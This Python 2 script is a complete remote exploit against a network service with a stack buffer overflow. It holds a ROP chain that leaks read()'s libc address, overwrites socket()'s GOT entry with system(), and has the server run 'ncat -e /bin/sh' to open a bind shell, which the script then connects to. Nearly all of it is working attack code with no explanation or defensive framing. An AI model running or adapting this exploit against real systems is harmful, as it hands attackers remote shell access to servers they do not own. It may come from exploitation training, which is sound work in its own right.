#!/usr/bin/python

#this is a simple python script to communicate with server over TCP 
import socket, sys, optparse, subprocess, time
from struct import pack, unpack
from termcolor import colored
#some constants for the vulnerable binary
OFFSET = 1036
WRITE_PLT = pack("<L", 0x080490d0)              #write() 's PLT 
READ_PLT = pack("<L", 0x08049040)               #read() 's PLT
SERVER_FD = pack("<L", 4)                       #file descriptor
READ_GOT = pack("<L", 0x0804c010)               #read() 's GOT 

BSS_ADDR = pack("<L",0x0804c060)                #BSS 
PPPR = pack("<L", 0x08049589)                   #address of pop pop pop ret gadget

SOCKET_GOT = pack("<L", 0x0804c050)             #socket() 's GOT
SOCKET_PLT = pack("<L", 0x08049140)             #socket() 's PLT  
def main():

    options = parse_args()
    CMD = 'ncat -e /bin/sh -lp ' + str(options.attacker_port)
    #opening socket and connecting to the remote server...
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((options.remote_host, options.remote_port))
    msg = server.recv(1024)
    time.sleep(1)
    
    print msg 
    print draw() + 'Sending payload to the remote server @ ' ,colored(options.remote_host + ':' + str(options.remote_port), 'yellow')
    server.send(create_payload(4))
    time.sleep(1)
    #leaking the address of read() from the server
    READ_ADDR = unpack('I', server.recv(4))[0]
    print colored('Leaking address of read().....\n', 'cyan')
    print draw() +"The address of read() is         : ", colored(hex(READ_ADDR), 'red'), '\n'
    
    SYSTEM_ADDR = READ_ADDR - 0xa7d40
    print draw() +"The address of system() is       : ", colored(hex(SYSTEM_ADDR), 'red'), '\n'
    time.sleep(1)
    server.send(pack('<L', SYSTEM_ADDR))
    time.sleep(1)
    print draw() + 'Starting a bind shell on the server...'
    print draw() + 'Connecting to the server...'
    server.send(CMD)
    p = subprocess.Popen(('ncat', options.remote_host,str(options.attacker_port)))
    print draw() + 'Got shell! Please enter commands!'
    p.wait()
    server.close()
    return

def parse_args():
    parser = optparse.OptionParser()
    parser.add_option('-H', '--remote-host', dest='remote_host', type='str')
    parser.add_option('-P', '--remote-port', dest='remote_port', type='int')
    parser.add_option('-k', '--attacker-port', dest='attacker_port', type='int', default=12345)
    try:
        options, remainder = parser.parse_args()
        for attr,val in options.__dict__.iteritems():
            if val is None:
                raise ValueError('Error!! ' + attr + ' is not provided!!')
        return options
    except Exception as e:
        print e
        sys.exit(-1)
    return

def create_payload(server_fd):
    
    #stack frame for write() 
    payload = "A" * OFFSET
    payload += WRITE_PLT 
    payload += PPPR                       #pppr 
    payload += server_fd 
    payload += READ_GOT
    payload += pack('<L', 4)              #size of data to be read from the server
 
    #stack frame for read() to overwrite the socket() 's GOT
    #with system() 's address in libc
    payload += READ_PLT                     
    payload += PPPR
    payload += SERVER_FD
    payload += SOCKET_GOT
    payload += pack('<L', 4)
    #stack frame for read() to store argv for system
    payload += READ_PLT
    payload += PPPR
    payload += SERVER_FD
    payload += BSS_ADDR
    payload += pack('<L', 100)       
    #stack frame for system() to open a shell to the attacker
    payload += SOCKET_PLT
    payload += "JUNK"               
    payload += BSS_ADDR
    return payload

def draw(char='+', color='green'):
    return '[' + colored(char, color) + '] '

if __name__ == "__main__": main()
